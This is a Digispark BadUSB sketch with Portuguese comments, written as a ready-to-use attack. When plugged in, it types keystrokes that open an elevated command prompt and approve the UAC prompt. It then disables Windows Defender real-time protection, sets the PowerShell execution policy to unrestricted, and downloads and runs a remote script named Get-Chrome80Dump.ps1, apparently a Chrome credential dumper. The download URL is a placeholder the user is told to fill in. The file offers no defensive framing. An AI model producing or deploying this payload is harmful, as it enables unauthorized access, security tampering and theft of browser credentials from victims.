#include "DigiKeyboard.h"

void setup() {
  // Aguarde a inicialização do sistema
  DigiKeyboard.delay(1000);

  // Pressione a tecla GUI (Windows key)
  DigiKeyboard.sendKeyStroke(KEY_R);
  DigiKeyboard.delay(300);

  // Digite "cmd" e pressione Ctrl+Shift+Enter
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0x80);  // 0x80 representa MOD_CONTROL | MOD_SHIFT
  DigiKeyboard.delay(3000);

  // Pressione Alt+Y
  DigiKeyboard.sendKeyStroke(KEY_Y, 0x02);  // 0x02 representa MOD_ALT
  DigiKeyboard.delay(1000);

  // Digite os comandos no prompt de comando
  DigiKeyboard.print("cd C:\\");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("set-executionpolicy unrestricted");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // Realize o download e execute o script .ps1
  DigiKeyboard.print("(new-object System.Net.WebClient).DownloadFile(\"COLE_AQUI_O_SEU_LINK_RAW\", \"$($env:LOCALAPPDATA)\\Get-Chrome80Dump.ps1\"); powershell \"$($env:LOCALAPPDATA)\\Get-Chrome80Dump.ps1\";");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Nada para fazer aqui
}
